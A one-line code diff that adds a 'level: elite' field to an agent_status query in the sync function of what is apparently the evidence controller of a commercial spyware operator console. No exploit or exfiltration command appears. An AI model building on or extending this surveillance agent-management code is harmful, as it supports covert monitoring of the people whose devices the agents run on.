@@ -152,7 +152,7 @@ package it.ht.rcs.console.evidence.controller
     
     public function sync(factory:String, instance:String, platform:String, version:String, user:String, device:String, onResult:Function = null):void
     {
-      DB.instance.evidence.agent_status({ident: factory, instance: instance, platform: platform}, function (event:ResultEvent):void {
+      DB.instance.evidence.agent_status({ident: factory, instance: instance, platform: platform, level: 'elite'}, function (event:ResultEvent):void {
                 
         if (event.result.status == 'OPEN' && event.result.deleted == false) {
           // send the sync parameters
